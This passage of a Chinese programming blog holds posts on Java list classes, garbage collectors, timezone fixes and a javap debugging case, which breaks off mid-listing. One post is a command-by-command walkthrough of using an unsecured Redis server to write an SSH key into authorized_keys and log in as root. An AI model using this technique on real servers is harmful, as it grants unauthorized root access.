<p>可以看出ArrayList的扩容是在ensureCapacityInternal方法中完成的，按着ensureCapacityInternal方法顺藤摸瓜可以找到grow方法这里才是真正的扩容代码，可以看出ArrayList扩容是直接用新的更长的数组替换掉旧的elementData数组，扩容后新容量是扩容前的容量的1.5倍，并与实际需求容量取最大值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">* Increases the capacity to ensure that it can hold at least the</span><br><span class="line">* number of elements specified by the minimum capacity argument.</span><br><span class="line">*</span><br><span class="line">* @param minCapacity the desired minimum capacity</span><br><span class="line">*/</span><br><span class="line">private void grow(int minCapacity) &#123;</span><br><span class="line">    // overflow-conscious code</span><br><span class="line">    int oldCapacity = elementData.length;</span><br><span class="line">    int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1);</span><br><span class="line">    if (newCapacity - minCapacity &lt; 0)</span><br><span class="line">    newCapacity = minCapacity;</span><br><span class="line">    if (newCapacity - MAX_ARRAY_SIZE &gt; 0)</span><br><span class="line">    newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">    // minCapacity is usually close to size, so this is a win:</span><br><span class="line">    elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h2><p>Vector类相比较ArrayList类，在成员变量上多了一个<code>protected int capacityIncrement</code>变量，主要用于扩容时的容量增长的计算，也就是说，Vector容量增长值的算法与ArrayList是有所不同的。</p>
<p>将关注点置于Vector与ArrayList类的不同点上，阅读源码可发现Vector类在<code>get</code>、<code>add</code>、<code>set</code>、<code>addAll</code>、<code>forEach</code>、<code>toArray</code>等方法上，均加了<code>synchronized</code>关键字，这里可以看出，Vector类与ArrayList相比增加了线程安全方面的考虑。</p>
<h2 id="CopyOnWriteArrayList"><a href="#CopyOnWriteArrayList" class="headerlink" title="CopyOnWriteArrayList"></a>CopyOnWriteArrayList</h2><p>成员变量上，主要增加了一个ReentrantLock变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/** The lock protecting all mutators */</span><br><span class="line">final transient ReentrantLock lock = new ReentrantLock();</span><br><span class="line"></span><br><span class="line">/** The array, accessed only via getArray/setArray. */</span><br><span class="line">private transient volatile Object[] array;</span><br></pre></td></tr></table></figure>

<p>了解<code>ReentrantLock</code>类的都知道，这是一个可重入锁，也就是说CopyOnWriteArrayList和Vector一样都有线程安全方面的考虑。那CopyOnWriteArrayList和Vector的区别是什么呢？</p>
<p>阅读CopyOnWriteArrayList源码发现，CopyOnWriteArrayList类在<code>get</code>、<code>forEach</code>、<code>toArray</code>等读的方法上，并没有加锁。在<code>add</code>、<code>set</code>、<code>addAll</code>等写的方法上除了使用了ReentrantLock锁之外，还增加了Array Copy的操作，使用Copy出的新的Array替换了就的Array，也正是因为这个操作，使得CopyOnWriteArrayList类在写的操作上不需要加锁。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>ArrayList与 CopyOnWriteArrayList和Vector的区别在于，CopyOnWriteArrayList和Vector是线程安全的，ArrayList不是线程安全的。CopyOnWriteArrayList和Vector的区别在于，CopyOnWriteArrayList读时不加锁，Vector读时加锁，CopyOnWriteArrayList写时进行了Array的拷贝，而Vector不进行拷贝。从性能上看，不加锁的ArrayList读写速度肯定都是最快的，而Vector写的速度比CopyOnWriteArrayList快，CopyOnWriteArrayList读的速度比Vector块。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://page.uetty.com/2019/07/29/compare-list-vertor-cowlist/" data-id="ck5qhi06f001lg0ukbj0u0l3s" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/">java</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-java-garbage-collector" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/17/java-garbage-collector/" class="article-date">
  <time datetime="2019-07-16T20:36:17.000Z" itemprop="datePublished">2019-07-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/17/java-garbage-collector/">JAVA垃圾收集器科普</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Serial收集器（新生代）"><a href="#Serial收集器（新生代）" class="headerlink" title="Serial收集器（新生代）"></a>Serial收集器（新生代）</h2><p>垃圾收集时，必须暂停其他所有工作线程（Stop The World)，采用的是复制回收算法，单线程收集</p>
<h2 id="Serial-Old搜集器（老年代）"><a href="#Serial-Old搜集器（老年代）" class="headerlink" title="Serial Old搜集器（老年代）"></a>Serial Old搜集器（老年代）</h2><p>Serial收集器的老年代版本</p>
<h2 id="ParNew收集器（新生代）"><a href="#ParNew收集器（新生代）" class="headerlink" title="ParNew收集器（新生代）"></a>ParNew收集器（新生代）</h2><p>serial收集器的多线程版本，没有太多的提升</p>
<h2 id="Parallel-Scavenge收集器（新生代）"><a href="#Parallel-Scavenge收集器（新生代）" class="headerlink" title="Parallel Scavenge收集器（新生代）"></a>Parallel Scavenge收集器（新生代）</h2><p>复制回收算法，并发多线程收集器，特点是与其他关注缩短垃圾收集时停顿时间的收集器的关注点不同，目标是达到可控的吞吐量（=运行用户代码时间/(运行用户代码时间 + 垃圾收集时间)），参数的两种设置方式：</p>
<ol>
<li>使用<code>-XX:MaxGCPauseMillis</code>参数，直接制定大于0的毫秒数，收集器将尽可能地保证手机时间不超过设定值。但如果值设定过小，可能导致频繁垃圾回收。</li>
<li>使用<code>-XX:GCTimeRatio</code>参数，设定值大于0小于100整数，如果设定49，则GC时间占总时间的2%（1 / (1 + 49)），默认值为99.</li>
</ol>
<p>另外还有一个常用参数<code>-XX:+UseAdaptiveSizePolicy</code>，是开关参数，设定后无需手工指定新生代、Eden区、Survivor区的比例、晋升老年代年龄（<code>-XX:PretenureSizeThreshold</code>），虚拟机将自动调整这些参数以提供最适合的停顿时间和吞吐量。</p>
<h2 id="Parallel-Old收集器（老年代）"><a href="#Parallel-Old收集器（老年代）" class="headerlink" title="Parallel Old收集器（老年代）"></a>Parallel Old收集器（老年代）</h2><p>Parallel Scavenge收集器的老年代版本</p>
<h2 id="CMS收集器（老年代）"><a href="#CMS收集器（老年代）" class="headerlink" title="CMS收集器（老年代）"></a>CMS收集器（老年代）</h2><p>CMS(Concurrent Mark Sweep)收集器，是有较大提升的一个版本，采用的是标记清清理算法，同时是地一个真正意义上的并发收集器，以获取最短回收停顿时间为目标。</p>
<p>垃圾收集过程分为4个步骤：</p>
<ol>
<li>初始标记</li>
<li>并发标记</li>
<li>重新标记</li>
<li>并发清除</li>
</ol>
<p>初始标记、重新标记两个步骤仍旧需要”Stop The World”，但这两个阶段都是耗时比较短的阶段。初始标记，只是标记GC Roots能够直接到达的对象，速度很快；并发标记阶段为进行GC Tracing的过程；重新标记阶段为了修正并发标记期间用户程序继续运作而导致的标记变动部分记录，比初始标记阶段时间稍长，但远低于并发标记阶段。</p>
<p>不足点：</p>
<ol>
<li>并发程序的通病，对CPU资源敏感，线程占用资源不可避免的导致程序变慢（吞吐量降低），及线程切换的消耗，默认启动的线程数量（(CPU数量 + 3)  / 4）。</li>
<li>标记清楚回收算法的常见问题，导致内存空间的碎片，碎片过多大对象分配会带来麻烦，无法找到足够大空间时，不得不提前触发Full GC。参数<code>-XX:+UseCMSCompactAtFullCollection</code>用于在CMS收集器顶不住要FullGC时开启碎片压缩整合（默认即是开启的），但整合过程无法并发。参数<code>-XX:CMSFullGCsBeforeCompaction</code>设置多少次不压缩后执行一次压缩整合（默认值0）</li>
<li>收集器运行时需要为浮动垃圾（并发搜集阶段用户线程仍在运行而产生的垃圾）预留足够内存空间，浮动垃圾在下一次GC时清理掉，因此不能像其他收集器一样等到几乎被填满时再进行收集。JDK1.5中默认68%空间时收集，JDK1.6中为92%，使用<code>-XX:CMSInitiatingOccupancyFraction</code>参数设置百分比。</li>
<li>concurrent mark时预留的内存无法满足程序需要，会导致<code>Concurrent Mode Failure</code>失败，这是虚拟机启用后备预案，临时使用Serial Old收集器重新进行老年代的垃圾收集。</li>
<li>CMS作为老年代收集器，无法与Parallel Scavenge收集器配合使用，只能与Serial收集器或ParNew收集器配合使用</li>
</ol>
<h2 id="G1收集器（不再物理性分代）"><a href="#G1收集器（不再物理性分代）" class="headerlink" title="G1收集器（不再物理性分代）"></a>G1收集器（不再物理性分代）</h2><p>最新的收集器，目标替换CMS收集器，仍需要更多的检验。从2004年论文发布起，近10年时间才推出的G1收集器的商用版本，采用化整为零的思路，将Java堆分成多个Region进行管理。但由于对象的引用实现上并没有看起来这么简单，与新生代老年代类似，每个Region区均为此留出了Remembered Set来避免全堆扫描。</p>
<p>G1收集器运行大致分为4个步骤：</p>
<ol>
<li>初始标记</li>
<li>并发标记</li>
<li>最终标记</li>
<li>筛选回收</li>
</ol>
<p>4个阶段与CMS收集器相似，在最终标记阶段，将并发阶段写在线程Remembered Set Logs里的标记变动记录合并到Remembered Set中。筛选回收阶段对各个Region回收价值和成本先进行排序，根据用户期望GC停顿时间来制定回收计划。</p>
<p>G1收集器特点：</p>
<ol>
<li>并行与并发，多CPU环境缩短Stop-The-World</li>
<li>将整个Java堆分成多个大小相等的独立的Region，分代概念仍在G1收集器保留，但新生代和老年代不再是物理隔离的了，它们都是一部分Region的集合</li>
<li>可以不需要其他收集器配合就能独立管理整个GC堆，并能够采用不同方式处理新创建的和旧的对象</li>
<li>整体上采用”标记-整理”算法，局部（两个Region之间）基于”复制回收”算法</li>
<li>一大特色优势点，可预测的停顿。与CMS收集器一样关注降低停顿时间之外，还建立了可预测的停顿时间模型，能让使用者明确指定控制在长度为M的毫秒时间片段内，消耗在垃圾收集上的时间不超过N毫秒。</li>
</ol>
<p>可预测的停顿，建立在有计划地避免在整个Java堆中进行全区域垃圾收集，G1跟踪各个Region里的垃圾堆积的价值大小（回收所获得的空间大小以及回收所需时间的经验值），在后台维护一个优先级列表，每次根据允许的收集时间优先回收高价值Region （这也是Garbage-First名称的由来）。</p>
<p>Sun给出测试结果显示，G1收集器对停顿时间的控制比CMS要更加地稳定可靠得多。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://page.uetty.com/2019/07/17/java-garbage-collector/" data-id="ck5qhi06d001ig0ukt56bdsex" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/">java</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-java-linux-timezone" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/10/java-linux-timezone/" class="article-date">
  <time datetime="2019-07-10T13:11:18.000Z" itemprop="datePublished">2019-07-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/10/java-linux-timezone/">Java及Ubuntu操作系统时区错误</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>程序部署时出现Java时间不正确，Java里打印<code>new Date()</code>后发现输出的时区不是CST，是时区不正确导致的问题。针对该问题进行修复，修改时区设置，配置如下:</p>
<ol>
<li><p>修改<code>/etc/localtime</code>软链接指向为<code>/usr/share/zoneinfo/Asia/Shanghai</code></p>
<blockquote>
<p>ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</p>
</blockquote>
</li>
</ol>
<p>此时出现了一个很有意思的现象：shell执行打印时间的命令<code>date</code>，发现输出时区为CST，但Java打印 <code>new Date()</code>输出，时区仍旧不是CST</p>
<ol start="2">
<li><p>修改<code>/etc/timezone</code>文件，将文件内唯一的一行<code>America/New_York</code>改为<code>Asia/Shanghai</code>，Java打印<code>new Date()</code>，输出时区为CST，修改成功</p>
</li>
<li><p>（相似的题外问题）如果需要修改系统字符集，可以修改<code>/etc/default/locale</code>（基于Ubuntu）文件设置为如下所示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LANG=&quot;zh_CN.UTF-8&quot;</span><br><span class="line">LANGUAGE=&quot;zh_CN:zh&quot;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>可以通过<code>locale -a</code>查看是否安装<code>zh_CN.UTF-8</code>字体，如未安装，通过<code>locale-gen zh_CN.UTF-8</code>命令安装</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://page.uetty.com/2019/07/10/java-linux-timezone/" data-id="ck5qhi06c001gg0ukcqeqdok0" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-redis-vulnerability" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/13/redis-vulnerability/" class="article-date">
  <time datetime="2019-06-13T12:36:26.000Z" itemprop="datePublished">2019-06-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/13/redis-vulnerability/">利用Redis写文件提权登陆linux的漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用redis的config命令修改rdb文件地址为ssh密钥文件，向redis中写入公共密钥，通过save命令手动刷新到rdb中，此时就可以用私钥登陆了</p>
<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>在本地电脑中（linux为例）生成无密码的密钥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -P &apos;&apos;    # 后面直接回车</span><br></pre></td></tr></table></figure>

<p>此时在~/.ssh/下生成两个文件<code>id_rsa</code>和<code>id_rsa.pub</code>，id_rsa是私钥，id_rsa_pub是公钥，公钥文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCf53Tg8bfLm8UQBFgm31YpMPuGDY3eWQ5GCiP4E7hdaSBvqSjeMjUOy5NWLg424BFWSFiKNF8oRBZpXtfhu+4AwgrwdSDJuKQtjJvrh7D+rnuxtzpGbqL/716S0e/+VHeh8PXnC+GPAMg72p7zDzHuYkvwkx/r6LSY9fspU25lHH4I9VrrxgPoS+BbU03i9LiGZFSTUSAljTJE3H5bPNpRPWlHlAZTxGXTYIGO+K2ZnUAg2+HtS246NONl6z1lVtxrS5G4yuiTeHJr+KWJD/DOiZ50EoYqbTHsjnTAM5MJTLHWH1jBIZ133OHW5RGmzyEuws6ge0Y6eGnxgwm2W09p uvince@DESKTOP-6JIM4T8</span><br></pre></td></tr></table></figure>

<p>进入服务器的redis命令行，输入如下一系列命令(注意ssh-rsa内容前后要有回车符\n)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">config set dir /.ssh</span><br><span class="line"></span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line">set ssh-test &quot;\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCf53Tg8bfLm8UQBFgm31YpMPuGDY3eWQ5GCiP4E7hdaSBvqSjeMjUOy5NWLg424BFWSFiKNF8oRBZpXtfhu+4AwgrwdSDJuKQtjJvrh7D+rnuxtzpGbqL/716S0e/+VHeh8PXnC+GPAMg72p7zDzHuYkvwkx/r6LSY9fspU25lHH4I9VrrxgPoS+BbU03i9LiGZFSTUSAljTJE3H5bPNpRPWlHlAZTxGXTYIGO+K2ZnUAg2+HtS246NONl6z1lVtxrS5G4yuiTeHJr+KWJD/DOiZ50EoYqbTHsjnTAM5MJTLHWH1jBIZ133OHW5RGmzyEuws6ge0Y6eGnxgwm2W09p uvince@DESKTOP-6JIM4T8\n&quot;</span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>此时，就已经往authorized_keys文件中写入了公钥</p>
<p>本地电脑使用命令<code>ssh -i ~/.ssh/id_rsa root@10.0.2.100</code>能够登陆服务器，这里-i后面是私钥的路径</p>
<p>这里面，有几个限制，一个是redis写文件的权限要能够到达该目录。现在写入的是root用户中，所以redis需要以root用户启动。如果知道某台服务器上有哪个用户，就可以把config set dir /.ssh 改为 config set dir /home/username/.ssh 了，最好还是redis和那个用户是同一个用户，这时候用config set dir ~/.ssh</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://page.uetty.com/2019/06/13/redis-vulnerability/" data-id="ck5qhi06a001cg0ukpbrknb9s" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnerability/">vulnerability</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-javap-example" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/06/12/javap-example/" class="article-date">
  <time datetime="2019-06-12T11:58:49.000Z" itemprop="datePublished">2019-06-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/06/12/javap-example/">JAVAP 反汇编字节码案例</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>javap 命令可将Java class文件反汇编为字节码，借助该命令可排查一些特殊的bug</p>
<h2 id="bug案例问题介绍"><a href="#bug案例问题介绍" class="headerlink" title="bug案例问题介绍"></a>bug案例问题介绍</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">MyTokenManager.MyTokenRenter tokenRenter = null;</span><br><span class="line">        MySearchCodeVo vo = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            tokenRenter = tokenManager.tryGetAvailableToken(GET_TOKEN_DELAY, MyTokenManager.RentType.SEARCH_CODE);</span><br><span class="line">            if (tokenRenter == null) &#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">            MyToken token = tokenRenter.getToken();</span><br><span class="line">            vo = searchCodeList(keywords, scopes, page, perPage, token.getToken());</span><br><span class="line">            return vo;</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            if (tokenRenter != null) &#123;</span><br><span class="line">                tokenRenter.giveBackToken(vo != null ? vo.getRateLimitRemain() : 1,       </span><br><span class="line">                        vo != null ? vo.getRateLimitReset() : 0L, vo != null ? vo.getRetryAfter() : null);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>上面代码运行，会出现偶现的NullPointerException，出现异常的代码位于<code>tokenRenter.giveBackToken(vo != null ? vo.getRateLimitRemain() : 1, vo != null ? vo.getRateLimitReset() : 0L, vo != null ? vo.getRetryAfter() : null)</code>，代码中涉及到的方法定义如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void giveBackToken(Integer, Long, Integer);</span><br><span class="line">Integer getRateLimitRemain();</span><br><span class="line">Long getRateLimitReset();</span><br><span class="line">Integer getRetryAfter();</span><br></pre></td></tr></table></figure>

<h2 id="问题排查步骤"><a href="#问题排查步骤" class="headerlink" title="问题排查步骤"></a>问题排查步骤</h2><p>使用javap命令对class文件进行反汇编，生成字节码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javap -c com.xxxx.xxxx.Myxxxx</span><br></pre></td></tr></table></figure>

<p>得到字节码信息，字节码中相关代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">0: aconst_null</span><br><span class="line">       1: astore        5</span><br><span class="line">       3: aconst_null</span><br><span class="line">       4: astore        6</span><br><span class="line">       6: aload         4</span><br><span class="line">       8: ldc2_w        #122                // long 4000l</span><br><span class="line">      11: getstatic     #124                // Field com/xxx/service/im/MyTokenManager$RentType.SEARCH_CODE:Lcom/xxx/service/im/MyTokenManager$RentType;</span><br><span class="line">      14: invokevirtual #125                // Method com/xxx/service/im/MyTokenManager.tryGetAvailableToken:(JLcom/xxx/service/im/MyTokenManager$RentType;)Lcom/xxx/service/im/MyTokenManager$MyTokenRenter;</span><br><span class="line">      17: astore        5</span><br><span class="line">      19: aload         5</span><br><span class="line">      21: ifnonnull     94</span><br><span class="line">      24: aconst_null</span><br><span class="line">      25: astore        7</span><br><span class="line">      27: aload         5</span><br><span class="line">      29: ifnull        91</span><br><span class="line">      32: aload         5</span><br><span class="line">      34: aload         6</span><br><span class="line">      36: ifnull        50</span><br><span class="line">      39: aload         6</span><br><span class="line">      41: invokevirtual #126                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitRemain:()Ljava/lang/Integer;</span><br><span class="line">      44: invokevirtual #14                 // Method java/lang/Integer.intValue:()I</span><br><span class="line">      47: goto          51</span><br><span class="line">      50: iconst_1</span><br><span class="line">      51: invokestatic  #45                 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;</span><br><span class="line">      54: aload         6</span><br><span class="line">      56: ifnull        70</span><br><span class="line">      59: aload         6</span><br><span class="line">      61: invokevirtual #127                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitReset:()Ljava/lang/Long;</span><br><span class="line">      64: invokevirtual #51                 // Method java/lang/Long.longValue:()J</span><br><span class="line">      67: goto          71</span><br><span class="line">      70: lconst_0</span><br><span class="line">      71: invokestatic  #55                 // Method java/lang/Long.valueOf:(J)Ljava/lang/Long;</span><br><span class="line">      74: aload         6</span><br><span class="line">      76: ifnull        87</span><br><span class="line">      79: aload         6</span><br><span class="line">      81: invokevirtual #128                // Method com/xxx/store/vo/im/MySearchCodeVo.getRetryAfter:()Ljava/lang/Integer;</span><br><span class="line">      84: goto          88</span><br><span class="line">      87: aconst_null</span><br><span class="line">      88: invokevirtual #129                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.giveBackToken:(Ljava/lang/Integer;Ljava/lang/Long;Ljava/lang/Integer;)V</span><br><span class="line">      91: aload         7</span><br><span class="line">      93: areturn</span><br><span class="line">      94: aload         5</span><br><span class="line">      96: invokevirtual #130                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.getToken:()Ljava/lang/Object;</span><br><span class="line">      99: checkcast     #131                // class com/xxx/store/vo/im/MyToken</span><br><span class="line">     102: astore        7</span><br><span class="line">     104: aload_0</span><br><span class="line">     105: aload_1</span><br><span class="line">     106: iload_2</span><br><span class="line">     107: iload_3</span><br><span class="line">     108: aload         7</span><br><span class="line">     110: invokevirtual #132                // Method com/xxx/store/vo/im/MyToken.getToken:()Ljava/lang/String;</span><br><span class="line">     113: invokestatic  #133                // Method searchCodeList:(Ljava/lang/String;Ljava/lang/String;IILjava/lang/String;)Lcom/xxx/store/vo/im/MySearchCodeVo;</span><br><span class="line">     116: astore        6</span><br><span class="line">     118: aload         6</span><br><span class="line">     120: astore        8</span><br><span class="line">     122: aload         5</span><br><span class="line">     124: ifnull        186</span><br><span class="line">     127: aload         5</span><br><span class="line">     129: aload         6</span><br><span class="line">     131: ifnull        145</span><br><span class="line">     134: aload         6</span><br><span class="line">     136: invokevirtual #126                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitRemain:()Ljava/lang/Integer;</span><br><span class="line">     139: invokevirtual #14                 // Method java/lang/Integer.intValue:()I</span><br><span class="line">     142: goto          146</span><br><span class="line">     145: iconst_1</span><br><span class="line">     146: invokestatic  #45                 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;</span><br><span class="line">     149: aload         6</span><br><span class="line">     151: ifnull        165</span><br><span class="line">     154: aload         6</span><br><span class="line">     156: invokevirtual #127                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitReset:()Ljava/lang/Long;</span><br><span class="line">     159: invokevirtual #51                 // Method java/lang/Long.longValue:()J</span><br><span class="line">     162: goto          166</span><br><span class="line">     165: lconst_0</span><br><span class="line">     166: invokestatic  #55                 // Method java/lang/Long.valueOf:(J)Ljava/lang/Long;</span><br><span class="line">     169: aload         6</span><br><span class="line">     171: ifnull        182</span><br><span class="line">     174: aload         6</span><br><span class="line">     176: invokevirtual #128                // Method com/xxx/store/vo/im/MySearchCodeVo.getRetryAfter:()Ljava/lang/Integer;</span><br><span class="line">     179: goto          183</span><br><span class="line">     182: aconst_null</span><br><span class="line">     183: invokevirtual #129                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.giveBackToken:(Ljava/lang/Integer;Ljava/lang/Long;Ljava/lang/Integer;)V</span><br><span class="line">     186: aload         8</span><br><span class="line">     188: areturn</span><br><span class="line">     189: astore        9</span><br><span class="line">     191: aload         5</span><br><span class="line">     193: ifnull        255</span><br><span class="line">     196: aload         5</span><br><span class="line">     198: aload         6</span><br><span class="line">     200: ifnull        214</span><br><span class="line">     203: aload         6</span><br><span class="line">     205: invokevirtual #126                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitRemain:()Ljava/lang/Integer;</span><br><span class="line">     208: invokevirtual #14                 // Method java/lang/Integer.intValue:()I</span><br><span class="line">     211: goto          215</span><br><span class="line">     214: iconst_1</span><br><span class="line">     215: invokestatic  #45                 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;</span><br><span class="line">     218: aload         6</span><br><span class="line">     220: ifnull        234</span><br><span class="line">     223: aload         6</span><br><span class="line">     225: invokevirtual #127                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitReset:()Ljava/lang/Long;</span><br><span class="line">     228: invokevirtual #51                 // Method java/lang/Long.longValue:()J</span><br><span class="line">     231: goto          235</span><br><span class="line">     234: lconst_0</span><br><span class="line">     235: invokestatic  #55                 // Method java/lang/Long.valueOf:(J)Ljava/lang/Long;</span><br><span class="line">     238: aload         6</span><br><span class="line">     240: ifnull        251</span><br><span class="line">     243: aload         6</span><br><span class="line">     245: invokevirtual #128                // Method 